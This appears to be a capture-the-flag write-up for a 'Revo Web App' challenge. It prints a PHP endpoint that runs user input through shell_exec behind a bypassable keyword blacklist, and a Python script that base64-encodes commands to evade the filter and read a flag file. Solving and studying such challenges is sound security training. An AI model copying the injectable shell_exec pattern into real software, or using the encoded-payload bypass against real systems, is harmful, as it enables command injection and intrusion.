### Revo Web App

Performing a directory scan reveals that there is a `/cmd.php` endpoint.

This seems to allow us to perform command injection, but there appears to be a blacklist filter. Fortunately, the `cat cmd.php` command works, allowing us to view the blacklist.

```php
<?php
  function test_input($data) {
    $str1 = "%44";
    $data2 = append_string ($str1, $data);
    return $data2;
  }
  
  function display()
  {
    $bl = array("/",";","@","\","\/\/");
    $input = $_POST["cmd"];
    $input = str_replace($bl, "", $input);
    $bl2 = array("curl","shutdown","init","systemctl","ps","ls","etc");
    $input = str_replace($bl2, "", $input);
    $output = shell_exec($input);
    echo $output;
  }
  if(isset($_POST['submit']))
  {
    display();
  } 
 ?>
```

To overcome the blacklist, we used a base64-encoded payload, which is then decoded by Python on the server.

```python
import base64

PAYLOAD = b"cat /home/bobby/flag.txt"

encoded = base64.b64encode(PAYLOAD)
print(encoded)

command = "python3 -c '__import__(\"os\").system((__import__(\"base64\").b64decode(\"" + encoded.decode() + "\")))'"
print(command)
```
